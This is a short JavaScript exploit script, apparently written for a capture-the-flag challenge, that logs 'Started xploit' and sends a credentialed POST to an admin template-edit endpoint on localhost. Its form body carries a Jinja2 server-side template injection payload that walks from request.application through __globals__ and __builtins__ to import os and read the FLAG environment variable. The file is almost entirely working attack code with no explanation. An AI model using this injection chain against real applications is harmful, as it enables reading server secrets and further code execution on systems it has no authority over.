console.log("Started xploit")
let x = fetch("/admin/templates/1/edit", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "no-cache",
    "content-type": "application/x-www-form-urlencoded",
    "pragma": "no-cache",
    "sec-ch-ua": "\"Brave\";v=\"147\", \"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"147\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Linux\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "sec-gpc": "1",
    "upgrade-insecure-requests": "1"
  },
  "referrer": "http://localhost:1337/admin/templates/1/edit",
  "body": "name=Default+Ticket+Template&html_content=%3Ch1%3E%7B%7B+request.application.__globals__.__builtins__.__import__%28%27os%27%29.environ.get%28%27FLAG%27%29+%7D%7D%3C%2Fh1%3E%3Cp%3E%7B%7B+buyer_name+%7D%7D%3C%2Fp%3E%3Cp%3E%7B%7B+ticket_code+%7D%7D%3C%2Fp%3E&is_default=on",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
console.log("Done")
